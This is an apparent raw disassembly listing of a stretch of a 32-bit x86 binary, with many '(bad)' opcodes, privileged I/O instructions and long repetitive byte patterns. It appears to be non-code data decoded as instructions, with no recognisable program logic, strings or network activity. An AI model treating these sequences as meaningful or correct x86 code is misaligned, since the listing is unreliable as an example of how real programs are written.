  42117e:	imul   esi,esp,0x62
  421181:	imul   eax,DWORD PTR [esp+edi*8+0xb806970],0xf87b68fd
  42118c:	push   0x74
  42118e:	jle    0x4211b9
  421190:	jbe    0x4211ff
  421192:	enter  0xfd27,0x68
  421196:	sar    eax,0x70
  421199:	arpl   ax,ax
  42119b:	lock imul esp,DWORD PTR [eax],0x766ef8a4
  4211a2:	retf   0x1d26
  4211a5:	jo     0x42116d
  4211a7:	daa    
  4211a8:	jo     0x421221
  4211aa:	shl    BYTE PTR [esi],0x61
  4211ad:	jae    0x4211c6
  4211af:	or     al,0x72
  4211b1:	je     0x421226
  4211b3:	or     ch,BYTE PTR [ebx+ebp*2+0x47]
  4211b7:	cld    
  4211b8:	pop    edi
  4211b9:	arpl   WORD PTR [eax+0x37746b28],ax
  4211bf:	lock pop ebp
  4211c1:	outs   dx,BYTE PTR ds:[esi]
	...
  4211ea:	add    BYTE PTR [eax],al
  4211ec:	xchg   dl,dh
  4211ee:	popa   
  4211ef:	jb     0x421238
  4211f1:	daa    
  4211f2:	pop    esi
  4211f3:	jae    0x421219
  4211f5:	and    ch,BYTE PTR [edx+esi*2+0x7b]
  4211f9:	es std 
  4211fb:	push   0x746af84b
  421200:	and    esp,DWORD PTR cs:[esi+0x65]
  421204:	ds gs add al,0x79
  421208:	sbb    esp,DWORD PTR [edx]
  42120a:	sbb    DWORD PTR [eax+0x6b],ebx
  42120d:	movups XMMWORD PTR [esi+edx*1],xmm6
  421211:	(bad)  
  421213:	xor    BYTE PTR [edx+0x6a],dh
  421216:	sub    eax,0xb8c46e23
  42121b:	and    cl,BYTE PTR [esi+0x64]
  42121e:	mov    esp,0x16625b2a
  421223:	pop    eax
  421224:	arpl   WORD PTR [edx+0x16],sp
  421227:	pop    eax
  421228:	pop    ebx
  421229:	bound  edx,QWORD PTR [esi]
  42122b:	pop    eax
  42122c:	and    eax,DWORD PTR [edx]
  42122e:	adc    ebx,DWORD PTR [eax+0x1b]
  421231:	add    dl,BYTE PTR [ebx]
  421233:	pop    eax
  421234:	and    eax,DWORD PTR [edx]
  421236:	adc    ebx,DWORD PTR [eax-0x1d]
  421239:	icebp  
  42123a:	mov    ah,0x67
  42123c:	shl    edi,cl
  42123e:	in     al,0x62
  421240:	int3   
  421241:	shr    ecx,cl
  421243:	jno    0x421227
  421245:	icebp  
  421246:	mov    esp,0xeee6d653
  42124b:	arpl   WORD PTR [ebx+0x66e384],sp
	...
  421279:	add    BYTE PTR [esi+edx*8-0x4d7dc200],ch
  421280:	add    dh,dl
  421282:	jbe    0x421236
  421284:	add    BYTE PTR [edx-0x73fbcd7c],dl
  42128a:	xor    BYTE PTR [edx],0x4
  42128d:	add    al,0x6c
  42128f:	xor    al,BYTE PTR [esi+ebp*1]
  421292:	push   0x32
  421294:	add    al,0xc
  421296:	xchg   edi,eax
  421297:	xor    al,BYTE PTR [edi+edi*8]
  42129a:	xchg   edi,eax
  42129b:	xor    al,BYTE PTR [ecx+ecx*1]
  42129e:	test   DWORD PTR [edx],esi
  4212a0:	add    al,0x8a
  4212a2:	xor    BYTE PTR [edx],0x4
  4212a5:	inc    ebx
  4212a6:	jnp    0x421303
  4212a8:	daa    
  4212a9:	add    al,0xc2
  4212ab:	lahf   
  4212ac:	daa    
  4212ad:	add    al,0x35
  4212af:	jge    0x4212d8
  4212b1:	add    al,0xa3
  4212b3:	jbe    0x4212dc
  4212b5:	add    al,0x10
  4212b7:	js     0x4212e0
  4212b9:	add    al,0x91
  4212bb:	ja     0x4212e4
  4212bd:	add    al,0x4a
  4212bf:	jae    0x4212e8
  4212c1:	add    al,0xc8
  4212c3:	jb     0x4212ec
  4212c5:	add    al,0x34
  4212c7:	jb     0x421270
  4212c9:	add    esi,DWORD PTR ds:0xf803a774
  4212cf:	jae    0x421278
  4212d1:	add    edi,DWORD PTR [esi+0x70]
  4212d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212d5:	add    edx,esi
  4212d7:	mov    DWORD PTR [edi-0x587480fd],esp
  4212dd:	add    eax,DWORD PTR [eax]
	...
  421307:	add    BYTE PTR [ebx-0x4ffc587a],ch
  42130d:	test   DWORD PTR [edi-0x58773afd],esp
  421313:	add    ecx,DWORD PTR [ecx-0x1bfc587e]
  421319:	jle    0x4212c2
  42131b:	add    ebx,DWORD PTR [edi+0x4703a77e]
  421321:	and    BYTE PTR [edi-0x58816ffd],0x3
  421328:	jecxz  0x4213a8
  42132a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42132b:	add    esp,DWORD PTR [ebp-0x3efc592f]
  421331:	shl    BYTE PTR [esi],1
  421333:	add    al,0x69
  421335:	int    0x26
  421337:	add    al,0x88
  421339:	loop   0x421361
  42133b:	add    al,0x3d
  42133d:	fbld   TBYTE PTR [esi]
  42133f:	add    al,0xb7
  421341:	fbld   TBYTE PTR [esi]
  421343:	add    al,0x7c
  421345:	loopne 0x42136d
  421347:	add    al,0x1
  421349:	loope  0x42134a
  42134b:	sub    BYTE PTR [edx],bh
  42134d:	stos   DWORD PTR es:[edi],eax
  42134e:	sahf   
  42134f:	sub    DWORD PTR [edx+0x1f],eax
  421352:	sahf   
  421353:	sub    DWORD PTR [edx],edi
  421355:	jge    0x4212f4
  421357:	sub    DWORD PTR [edx-0x1],eax
  42135a:	pushf  
  42135b:	sub    DWORD PTR [edx],edi
  42135d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42135e:	mov    al,ds:0x9fce4229
  421363:	sub    DWORD PTR [edx],edi
  421365:	sub    al,0xa8
  421367:	sub    DWORD PTR [edx+0x42],eax
  42136a:	scas   al,BYTE PTR es:[edi]
  42136b:	sub    DWORD PTR [eax],eax
	...
  421395:	add    BYTE PTR [edx],bh
  421397:	ins    DWORD PTR es:[edi],dx
  421398:	scas   al,BYTE PTR es:[edi]
  421399:	sub    DWORD PTR [edx+0x6],eax
  42139c:	mov    ebp,0xc0313da9
  4213a1:	test   eax,0xa9c0a43d
  4213a6:	cmp    eax,0x3da9bff5
  4213ab:	push   0x933da9bf
  4213b0:	mov    edi,0xbf863da9
  4213b5:	test   eax,0xa9bf213d
  4213ba:	cmp    eax,0x3da9c1c8
  4213bf:	shr    DWORD PTR ds:[ecx-0x563c9bc3],0x3d
  4213c7:	out    0xc2,eax
  4213c9:	test   eax,0xa9c3253d
  4213ce:	cmp    eax,0x3da9c68d
  4213d3:	retf   0xa9c4
  4213d6:	cmp    eax,0x3da9c86c
  4213db:	xlat   BYTE PTR ds:[ebx]
  4213dc:	(bad)  
  4213dd:	sub    DWORD PTR [edx],edi
  4213df:	loopne 0x4213a7
  4213e1:	sub    DWORD PTR [edx+0x66],eax
  4213e4:	retf   0x3a29
  4213e7:	adc    eax,0x644229cb
  4213ec:	into   
  4213ed:	add    BYTE PTR [edi],ah
  4213ef:	push   edi
  4213f0:	adc    ecx,0xd1e55717
  4213f6:	pop    ss
  4213f7:	push   edi
  4213f8:	mov    ebp,0xd5
	...
  421421:	add    BYTE PTR [eax],al
  421423:	add    BYTE PTR [edi],ah
  421425:	push   edi
  421426:	int3   
  421427:	xlat   BYTE PTR ds:[ebx]
  421428:	daa    
  421429:	push   edi
  42142a:	add    eax,0x525717da
  42142f:	ficom  DWORD PTR [edi]
  421431:	push   edi
  421432:	(bad)  
  421433:	fsub   QWORD PTR [edi+0x57]
  421436:	or     ebx,ebp
  421438:	addr16 push edi
  42143a:	mov    ebp,ebx
  42143c:	push   edi
  42143d:	push   edi
  42143e:	cld    
  42143f:	fst    QWORD PTR [edi+0x57]
  421442:	jp     0x421422
  421444:	addr16 push edi
  421446:	clc    
  421447:	fsubrp st(7),st
  421449:	pop    ecx
  42144a:	je     0x42142e
  42144c:	xlat   BYTE PTR ds:[ebx]
  42144d:	pop    ecx
  42144e:	loop   0x421432
  421450:	xlat   BYTE PTR ds:[ebx]
  421451:	pop    ecx
  421452:	pavgw  mm4,QWORD PTR [edi-0x581c0aa7]
  421459:	pop    ecx
  42145a:	sub    ah,ah
  42145c:	xchg   edi,eax
  42145d:	pop    ecx
  42145e:	(bad)  
  42145f:	out    0x97,al
  421461:	pop    ecx
  421462:	cld    
  421463:	out    0xa7,al
  421465:	pop    ecx
  421466:	xor    ah,bh
  421468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421469:	pop    ecx
  42146a:	outs   dx,BYTE PTR ds:[esi]
  42146b:	jmp    0xed176e07
  421470:	xchg   edi,eax
  421471:	pop    ecx
  421472:	mov    esi,0x6758e7ee
  421477:	cmc    
  421478:	out    0x58,eax
  42147a:	dec    edx
  42147b:	not    bh
  42147d:	pop    eax
  42147e:	add    BYTE PTR [eax],al
  421480:	pop    ss
  421481:	pop    ecx
  421482:	add    BYTE PTR [eax],al
  421484:	daa    
  421485:	pop    ecx
	...
  4214b2:	daa    
  4214b3:	pop    ecx
  4214b4:	add    BYTE PTR [eax],al
  4214b6:	pop    ss
  4214b7:	pop    ecx
  4214b8:	add    BYTE PTR [eax],al
  4214ba:	repnz add BYTE PTR ds:[ecx+0x6a],al
  4214bf:	fwait
  4214c0:	in     eax,0x6d
  4214c2:	push   0x52
  4214c4:	int3   
  4214c5:	pop    esi
  4214c6:	ins    DWORD PTR es:[edi],dx
  4214c7:	stos   BYTE PTR es:[edi],al
  4214c8:	add    al,0x51
  4214ca:	mov    dh,BYTE PTR [ebx]
  4214cc:	mov    eax,0xc9ff6d52
  4214d1:	dec    edx
  4214d2:	outs   dx,BYTE PTR ds:[esi]
  4214d3:	inc    ebp
  4214d4:	mov    dl,0x53
  4214d6:	sbb    ebp,DWORD PTR ds:0x4e1affc7
  4214dc:	arpl   WORD PTR cs:[esi],si
  4214df:	push   edi
  4214e0:	add    al,0x23
  4214e2:	outs   dx,BYTE PTR ds:[esi]
  4214e3:	sar    BYTE PTR [eax-0x29ffd201],0x62
  4214ea:	ds popa 
  4214ec:	in     al,dx
  4214ed:	bound  ebp,QWORD PTR [edx]
  4214ef:	inc    ch
  4214f1:	ja     0x42150e
  4214f3:	adc    esi,edx
  4214f5:	jae    0x42151a
  4214f7:	mov    bl,0x0
  4214f9:	pop    edi
  4214fa:	sbb    al,0x11
  4214fc:	in     eax,0x2d
  4214fe:	fcom   QWORD PTR [edx]
  421500:	aad    0xff
  421502:	inc    esi
  421503:	or     ecx,DWORD PTR [esi]
  421505:	or     bh,BYTE PTR [ebx]
  421507:	or     BYTE PTR [edx],cl
  421509:	and    BYTE PTR [ebx+ebx*1],ah
  42150c:	out    0x68,eax
  42150e:	push   ds
  42150f:	pop    ds
  421510:	pop    es
  421511:	and    dl,bl
  421513:	into   
  421514:	in     al,dx
  421515:	pop    ds
	...
  42153e:	add    BYTE PTR [eax],al
  421540:	aaa    
  421541:	pop    ss
  421542:	adc    ah,BYTE PTR [eax]
  421544:	push   ds
  421545:	test   DWORD PTR [esi],0x20d4a707
  42154b:	pop    es
  42154c:	inc    edi
  42154d:	adc    ah,dh
  42154f:	ja     0x4214e8
  421551:	adc    ebp,0x2112371f
  421557:	and    BYTE PTR [ebx-0x3d],ah
  42155a:	and    BYTE PTR [eax],ah
  42155c:	inc    edi
  42155d:	pop    ebx
  42155e:	pop    es
  42155f:	and    al,0xa3
  421561:	ins    BYTE PTR es:[edi],dx
  421562:	push   ebx
  421563:	jmp    0x421586
  421565:	push   edx
  421566:	in     al,0x23
  421568:	popa   
  421569:	jno    0x4215ad
  42156b:	or     DWORD PTR [ebx+edi*1+0x4b],eax
  42156f:	loope  0x4215c6
  421571:	cmp    esi,eax
  421573:	and    ebx,DWORD PTR [esi]
  421575:	mul    DWORD PTR ss:[ebx]
  421578:	cmp    eax,DWORD PTR ds:[edi]
  42157b:	and    al,0x1e
  42157d:	cmp    esp,ecx
  42157f:	(bad)  
  421580:	pop    ds
  421581:	cmp    eax,edi
  421583:	and    edi,DWORD PTR [esi]
  421585:	mov    bh,bh
  421587:	loopne 0x4215ae
  421589:	outs   dx,DWORD PTR ds:[esi]
  42158a:	ficom  DWORD PTR ds:0xe8137760
  421590:	test   eax,0x3e03e6fb
  421595:	pop    ebx
  421596:	out    0x3,eax
  421598:	ds pop ebx
  42159a:	out    0x3,eax
  42159c:	ds pop ebx
  42159e:	out    0x3,eax
  4215a0:	ds pop ebx
  4215a2:	out    0x3,eax
	...
  4215cc:	add    BYTE PTR [eax],al
  4215ce:	ds pop ebx
  4215d0:	out    0x3,eax
  4215d2:	ds pop ebx
  4215d4:	out    0x3,eax
  4215d6:	ds pop ebx
  4215d8:	out    0x3,eax
  4215da:	ds pop ebx
  4215dc:	out    0x3,eax
  4215de:	ds pop ebx
  4215e0:	out    0x3,eax
  4215e2:	ds pop ebx
  4215e4:	out    0x3,eax
  4215e6:	ds pop ebx
  4215e8:	out    0x3,eax
  4215ea:	ds pop ebx
  4215ec:	out    0x3,eax
  4215ee:	ds pop ebx
  4215f0:	out    0x3,eax
  4215f2:	ds pop ebx
  4215f4:	out    0x3,eax
  4215f6:	ds pop ebx
  4215f8:	out    0x3,eax
  4215fa:	ds pop ebx
  4215fc:	out    0x3,eax
  4215fe:	ds pop ebx
  421600:	add    cl,ch
  421602:	cmp    eax,0x3de9005b
  421607:	pop    ebx
  421608:	add    cl,ch
  42160a:	cmp    eax,0x3de9005b
  42160f:	pop    ebx
  421610:	add    cl,ch
  421612:	cmp    eax,0x3de9005b
  421617:	pop    ebx
  421618:	add    cl,ch
  42161a:	cmp    eax,0x3de9005b
  42161f:	pop    ebx
  421620:	add    cl,ch
  421622:	cmp    eax,0x3de9005b
  421627:	pop    ebx
  421628:	add    cl,ch
  42162a:	cmp    eax,0x3de9005b
  42162f:	pop    ebx
  421630:	add    cl,ch
	...
  42165a:	add    BYTE PTR [eax],al
  42165c:	cmp    eax,0x3de9005b
  421661:	pop    ebx
  421662:	add    cl,ch
  421664:	cmp    eax,0x3de9005b
  421669:	pop    ebx
  42166a:	add    cl,ch
  42166c:	cmp    eax,0x3de9005b
  421671:	pop    ebx
  421672:	add    cl,ch
  421674:	cmp    eax,0x3de9005b
  421679:	pop    ebx
  42167a:	add    cl,ch
  42167c:	cmp    eax,0x3de9005b
  421681:	pop    ebx
  421682:	add    cl,ch
  421684:	cmp    eax,0x3de9005b
  421689:	pop    ebx
  42168a:	add    cl,ch
  42168c:	cmp    eax,0x3de9005b
  421691:	pop    ebx
  421692:	add    cl,ch
  421694:	cmp    eax,0x3de9005b
  421699:	pop    ebx
  42169a:	add    cl,ch
  42169c:	cmp    eax,0x3de9005b
  4216a1:	pop    ebx
  4216a2:	add    BYTE PTR [eax],al
  4216a4:	pop    ss
  4216a5:	pop    esi
  4216a6:	add    BYTE PTR [eax],al
  4216a8:	pop    ss
  4216a9:	pop    esi
  4216aa:	add    BYTE PTR [eax],al
  4216ac:	daa    
  4216ad:	pop    esi
  4216ae:	add    BYTE PTR [eax],al
  4216b0:	daa    
  4216b1:	pop    esi
  4216b2:	add    BYTE PTR [eax],al
  4216b4:	pop    ss
  4216b5:	pop    esi
  4216b6:	add    BYTE PTR [eax],al
  4216b8:	pop    ss
  4216b9:	pop    esi
  4216ba:	add    BYTE PTR [eax],al
  4216bc:	out    0x5d,eax
	...
  4216ea:	out    0x5d,eax
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	xlat   BYTE PTR ds:[ebx]
  4216ef:	pop    ebp
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	xlat   BYTE PTR ds:[ebx]
  4216f3:	pop    ebp
  4216f4:	add    BYTE PTR [eax],al
  4216f6:	out    0x5d,eax
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	out    0x5d,eax
  4216fc:	add    BYTE PTR [eax],al
  4216fe:	xlat   BYTE PTR ds:[ebx]
  4216ff:	pop    ebp
  421700:	add    BYTE PTR [eax],al
  421702:	xlat   BYTE PTR ds:[ebx]
  421703:	pop    ebp
  421704:	add    BYTE PTR [eax],al
  421706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421707:	pop    ebp
  421708:	add    BYTE PTR [eax],al
  42170a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170b:	pop    ebp
  42170c:	add    BYTE PTR [eax],al
  42170e:	xchg   edi,eax
  42170f:	pop    ebp
  421710:	add    BYTE PTR [eax],al
  421712:	xchg   edi,eax
  421713:	pop    ebp
  421714:	add    BYTE PTR [eax],al
  421716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421717:	pop    ebp
  421718:	add    BYTE PTR [eax],al
  42171a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42171b:	pop    ebp
  42171c:	add    BYTE PTR [eax],al
  42171e:	xchg   edi,eax
  42171f:	pop    ebp
  421720:	add    BYTE PTR [eax],al
  421722:	xchg   edi,eax
  421723:	pop    ebp
  421724:	add    BYTE PTR [eax],al
  421726:	addr16 pop ebp
  421728:	add    BYTE PTR [eax],al
  42172a:	addr16 pop ebp
  42172c:	add    BYTE PTR [eax],al
  42172e:	push   edi
  42172f:	pop    ebp
  421730:	add    BYTE PTR [eax],al
  421732:	push   edi
  421733:	pop    ebp
  421734:	add    BYTE PTR [eax],al
  421736:	addr16 pop ebp
  421738:	add    BYTE PTR [eax],al
  42173a:	addr16 pop ebp
  42173c:	add    BYTE PTR [eax],al
  42173e:	push   edi
  42173f:	pop    ebp
  421740:	add    BYTE PTR [eax],al
  421742:	push   edi
  421743:	pop    ebp
  421744:	add    BYTE PTR [eax],al
  421746:	add    al,BYTE PTR ds:[ecx]
  421749:	add    BYTE PTR [esi],bh
  42174b:	add    al,BYTE PTR [ecx]
	...
  421775:	add    BYTE PTR [eax],al
  421777:	add    BYTE PTR [esi],bh
  421779:	add    al,BYTE PTR [ecx]
  42177b:	add    BYTE PTR [esi],bh
  42177d:	add    al,BYTE PTR [ecx]
  42177f:	add    BYTE PTR [esi],bh
  421781:	add    al,BYTE PTR [ecx]
  421783:	add    BYTE PTR [esi],bh
  421785:	add    al,BYTE PTR [ecx]
  421787:	add    BYTE PTR [esi],bh
  421789:	add    al,BYTE PTR [ecx]
  42178b:	add    BYTE PTR [esi],bh
  42178d:	add    al,BYTE PTR [ecx]
  42178f:	add    BYTE PTR [esi],bh
  421791:	add    al,BYTE PTR [ecx]
  421793:	add    BYTE PTR [esi],bh
  421795:	add    al,BYTE PTR [ecx]
  421797:	add    BYTE PTR [esi],bh
  421799:	add    al,BYTE PTR [ecx]
  42179b:	add    BYTE PTR [esi],bh
  42179d:	add    al,BYTE PTR [ecx]
  42179f:	add    BYTE PTR [esi],bh
  4217a1:	add    al,BYTE PTR [ecx]
  4217a3:	add    BYTE PTR [esi],bh
  4217a5:	add    al,BYTE PTR [ecx]
  4217a7:	add    BYTE PTR [esi],bh
  4217a9:	add    al,BYTE PTR [ecx]
  4217ab:	add    BYTE PTR [esi],bh
  4217ad:	add    al,BYTE PTR [ecx]
  4217af:	add    BYTE PTR [esi],bh
  4217b1:	add    al,BYTE PTR [ecx]
  4217b3:	add    BYTE PTR [esi],bh
  4217b5:	add    al,BYTE PTR [ecx]
  4217b7:	add    BYTE PTR [esi],bh
  4217b9:	add    al,BYTE PTR [ecx]
  4217bb:	add    BYTE PTR [esi],bh
  4217bd:	add    esp,DWORD PTR [ebx+eax*2]
  4217c0:	and    DWORD PTR [ebx-0x54],edi
  4217c3:	retf   
  4217c4:	mov    eax,ds:0xa6ba3588
  4217c9:	sbb    BYTE PTR [ebp-0x5394d1cf],ch
  4217cf:	retf   
  4217d0:	imul   eax,DWORD PTR [ebx],0x81d94324
  4217d6:	add    DWORD PTR [eax+0x3e],eax
  4217d9:	bound  eax,QWORD PTR [eax+edx*1]
	...
  421804:	add    BYTE PTR [eax],al
  421806:	ds jmp 0xff01:0x43e0400
  42180e:	push   ecx
  42180f:	add    al,BYTE PTR [ecx]
  421811:	cmp    BYTE PTR [esi],0x5b
  421814:	out    0x3,eax
  421816:	(bad)  
  421817:	pop    edx
  421818:	out    0x3,eax
  42181a:	pop    esi
  42181b:	pop    ebx
  42181c:	out    0x3,eax
  42181e:	dec    esi
  42181f:	pop    ebx
  421820:	out    0x3,eax
  421822:	ss pop ebx
  421824:	out    0x3,eax
  421826:	cmp    bl,BYTE PTR [ebx-0x19]
  421829:	add    edi,DWORD PTR [ebx+ebx*2]
  42182c:	out    0x3,eax
  42182e:	adc    eax,edi
  421830:	out    0x83,al
  421832:	ds pop ebx
  421834:	out    0xc3,eax
  421836:	add    eax,edi
  421838:	out    0x23,al
  42183a:	ds pop ebx
  42183c:	out    0xf3,eax
  42183e:	icebp  
  42183f:	mul    esi
  421841:	or     edi,DWORD PTR [esi]
  421843:	pop    ebx
  421844:	out    0xff,eax
  421846:	loope  0x42183f
  421848:	out    0x1,al
  42184a:	ds pop ebx
  42184c:	out    0x4,eax
  42184e:	ds pop ebx
  421850:	addr16 add al,0x3e
  421853:	pop    ebx
  421854:	daa    
  421855:	add    al,0x3e
  421857:	pop    ebx
  421858:	mov    DWORD PTR [ebx],0x3f75b3e
  42185e:	ds pop ebx
  421860:	fild   WORD PTR [ebx]
  421862:	ds pop ebx
  421864:	jmp    0x421869
  421866:	ds pop ebx
  421868:	jmp    0x421870
	...
  421891:	add    BYTE PTR [eax],al
  421893:	add    BYTE PTR [esi],bh
  421895:	pop    ebx
  421896:	call   0xaf9d569e
  42189b:	adc    edx,DWORD PTR [esi+0x3b]
  42189e:	push   ebx
  4218a0:	cmp    DWORD PTR [ebx+0x20],ebx
  4218a3:	adc    eax,0xf4f03a21
  4218a8:	cmp    BYTE PTR [edx+0x11],bl
  4218ab:	adc    dl,BYTE PTR [edi*1+0x5d37f1e1]
  4218b2:	add    dl,BYTE PTR [ebx]
  4218b4:	daa    
  4218b5:	cmp    al,0x0
  4218b7:	test   DWORD PTR [ebx+0x49],0x655bcf26
  4218be:	push   es
  4218bf:	in     al,0x2e
  4218c1:	inc    esp
  4218c2:	and    edi,esp
  4218c4:	bound  eax,QWORD PTR cs:[ebx]
  4218c7:	aad    0x41
  4218c9:	inc    edi
  4218ca:	and    al,0xed
  4218cc:	sbb    DWORD PTR [ebx+0x4],esp
  4218cf:	loop   0x4218fd
  4218d1:	fs add eax,ebp
  4218d4:	aas    
  4218d5:	pop    edi
  4218d6:	push   es
  4218d7:	loope  0x421920
  4218d9:	addr16 push cs
  4218db:	ficom  WORD PTR [edx]
  4218dd:	dec    esp
  4218de:	adc    edi,esi
  4218e0:	add    dl,BYTE PTR [esp+ebx*1-0x14]
  4218e4:	in     eax,dx
  4218e5:	fs adc eax,0x195cf1e9
  4218eb:	fistp  QWORD PTR [esi]
  4218ed:	dec    edi
  4218ee:	pop    es
  4218ef:	fucomip st,st(7)
  4218f1:	arpl   WORD PTR [ecx],ax
  4218f3:	loopne 0x4218cd
  4218f5:	addr16 push es
  4218f7:	rol    DWORD PTR [eax],cl
	...
  421921:	add    ah,cl
  421923:	(bad)  
  421924:	inc    DWORD PTR [eax]
  421926:	sub    eax,0x33d72455
  42192b:	push   edx
  42192c:	and    eax,0x2d3b61db
  421931:	ret    0x3d4d
  421934:	xor    eax,0x274239c8
  421939:	mov    eax,0xe91d575c
  42193e:	cdq    
  42193f:	cmc    
  421940:	(bad)  
  421941:	call   0xe9427483
  421946:	cmp    eax,0x81edfcf6
  42194b:	cmc    
  42194c:	jmp    esp
  42194e:	cmp    eax,0x71ecfff6
  421953:	cmc    
  421954:	cld    
  421955:	in     eax,0x3d
  421957:	pop    ebx
  421958:	add    BYTE PTR [eax],al
  42195a:	push   edi
  42195b:	pop    edx
  42195c:	std    
  42195d:	jmp    DWORD PTR [edi-0xa]
  421960:	cld    
  421961:	jmp    DWORD PTR [edi-0xa]
  421964:	std    
  421965:	add    BYTE PTR [ebx-0xa],ah
  421968:	std    
  421969:	add    BYTE PTR [edi-0xa],dl
  42196c:	cld    
  42196d:	jmp    DWORD PTR [ebx]
  42196f:	idiv   ah
  421971:	add    BYTE PTR [ebx],ah
  421973:	pop    edx
  421974:	std    
  421975:	add    BYTE PTR [edi],dl
  421977:	pop    edx
  421978:	add    BYTE PTR [ecx],al
  42197a:	adc    ebx,DWORD PTR [edx+0x0]
  42197d:	add    BYTE PTR [ebx],ah
  42197f:	idiv   ah
  421981:	jmp    DWORD PTR [edi]
  421983:	idiv   ah
	...
  4219ad:	add    BYTE PTR [eax],al
  4219af:	add    BYTE PTR [edi],dl
  4219b1:	idiv   ah
  4219b3:	add    BYTE PTR [edi],dl
  4219b5:	idiv   ch
  4219b7:	jmp    edi
  4219b9:	cmc    
  4219ba:	std    
  4219bb:	jmp    edi
  4219bd:	pop    ecx
  4219be:	std    
  4219bf:	add    bh,dl
  4219c1:	pop    ecx
  4219c2:	std    
  4219c3:	add    bl,dl
  4219c5:	cmc    
  4219c6:	cld    
  4219c7:	add    bl,ah
  4219c9:	pop    ecx
  4219ca:	std    
  4219cb:	jmp    ebx
  4219cd:	pop    ecx
  4219ce:	add    BYTE PTR [ecx],al
  4219d0:	jecxz  0x421a2b
  4219d2:	add    BYTE PTR [ecx],al
  4219d4:	rcr    DWORD PTR [ecx-0x3],cl
  4219d7:	jmp    DWORD PTR [edi-0x5cffffa7]
  4219dd:	cmc    
  4219de:	cld    
  4219df:	jmp    DWORD PTR [ebx-0x6800020b]
  4219e5:	pop    ecx
  4219e6:	add    BYTE PTR [ecx],al
  4219e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219e9:	pop    ecx
  4219ea:	std    
  4219eb:	jmp    DWORD PTR [ebx-0x5cff020b]
  4219f1:	pop    ecx
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	xchg   edi,eax
  4219f5:	pop    ecx
  4219f6:	std    
  4219f7:	add    BYTE PTR [edi-0xb],ah
  4219fa:	std    
  4219fb:	add    BYTE PTR [esi],bh
  4219fd:	add    al,0x1
  4219ff:	add    BYTE PTR [edi],bh
  421a01:	add    al,0x1
  421a03:	add    BYTE PTR [edi],bh
  421a05:	add    al,0xfd
  421a07:	call   FWORD PTR [ecx-0x1]
  421a0a:	add    bh,bh
  421a0c:	ds add al,0x1
  421a0f:	dec    DWORD PTR [ecx+0x3]
  421a12:	std    
  421a13:	inc    BYTE PTR [eax]
	...
  421a3d:	add    BYTE PTR [ecx+0x7],al
  421a40:	add    DWORD PTR [eax],eax
  421a42:	aas    
  421a43:	add    bh,ch
  421a45:	push   DWORD PTR [ecx]
  421a47:	pop    es
  421a48:	add    DWORD PTR [eax],eax
  421a4a:	ds (bad) 
  421a4c:	cld    
  421a4d:	(bad)  
  421a4e:	ds push es
  421a50:	std    
  421a51:	(bad)  
  421a52:	sbb    edi,edi
  421a54:	cld    
  421a55:	(bad)  
  421a56:	ds push es
  421a58:	add    edi,edi
  421a5a:	or     DWORD PTR [ebx],eax
  421a5c:	add    edi,edi
  421a5e:	ds push es
  421a60:	std    
  421a61:	(bad)  
  421a62:	inc    BYTE PTR ds:[eax]
  421a65:	add    BYTE PTR [edi],bh
  421a67:	push   es
  421a68:	std    
  421a69:	(bad)  
  421a6a:	jmp    0xe241176d
  421a6f:	add    bh,ch
  421a71:	(bad)  
  421a72:	ds (bad) 
  421a74:	cld    
  421a75:	call   ecx
  421a77:	add    bh,ch
  421a79:	(bad)  
  421a7a:	ds add bh,ch
  421a7d:	(bad)  
  421a7e:	add    al,BYTE PTR ds:[ecx]
  421a81:	add    BYTE PTR [esi],bh
  421a83:	inc    BYTE PTR [eax]
  421a85:	push   DWORD PTR [ecx-0x560102fe]
  421a8b:	add    al,BYTE PTR [ecx]
  421a8d:	add    BYTE PTR [esi],bh
  421a8f:	push   es
  421a90:	add    edi,edi
  421a92:	and    al,BYTE PTR ds:[ecx-0x7efd41f0]
  421a99:	add    BYTE PTR [esi+0x3e008102],bh
  421a9f:	pop    ebx
  421aa0:	pop    es
  421aa1:	test   BYTE PTR [eax],al
	...
  421acb:	add    BYTE PTR [esi+0x5b],cl
  421ace:	out    0x3,eax
  421ad0:	dec    esi
  421ad1:	pop    ebx
  421ad2:	pop    es
  421ad3:	add    al,0x3e
  421ad5:	pop    ebx
  421ad6:	pop    es
  421ad7:	add    al,0x4e
  421ad9:	fild   DWORD PTR [esi]
  421adb:	test   BYTE PTR [esi],bh
  421add:	fild   DWORD PTR [esi]
  421adf:	add    al,0x3e
  421ae1:	fild   DWORD PTR [esi]
  421ae3:	test   BYTE PTR [esi],ch
  421ae5:	(bad)  
  421ae7:	sub    DWORD PTR [esi],0xffffffdb
  421aea:	out    0x3,al
  421aec:	ds (bad) 
  421aef:	cmp    DWORD PTR [esi],0xffffffdb
  421af2:	out    0x3,al
  421af4:	dec    esi
  421af5:	pop    ebx
  421af6:	mov    DWORD PTR [ebx],0x3c75b3e
  421afc:	cs (bad) 
  421aff:	sub    DWORD PTR [esi],0x5b
  421b02:	mov    DWORD PTR [ebx],0x83c75b2e
  421b08:	ds (bad) 
  421b0b:	add    edi,DWORD PTR [esi]
  421b0d:	pop    ebx
  421b0e:	out    0x3,eax
  421b10:	ds (bad) 
  421b13:	cmp    DWORD PTR [esi],0x5b
  421b16:	pop    es
  421b17:	test   BYTE PTR [esi+0x5b],cl
  421b1a:	out    0x3,eax
  421b1c:	fild   DWORD PTR cs:[esi]
  421b1f:	add    al,0x2e
  421b21:	pop    ebx
  421b22:	pop    es
  421b23:	add    al,0x3e
  421b25:	(bad)  
  421b27:	add    edi,DWORD PTR [esi]
  421b29:	pop    ebx
  421b2a:	out    0x83,eax
  421b2c:	dec    esi
  421b2d:	pop    ebx
  421b2e:	mov    DWORD PTR [ebx+0x0],0x0
	...
  421b58:	add    BYTE PTR [eax],al
  421b5a:	ds pop ebx
  421b5c:	out    0x83,eax
  421b5e:	dec    esi
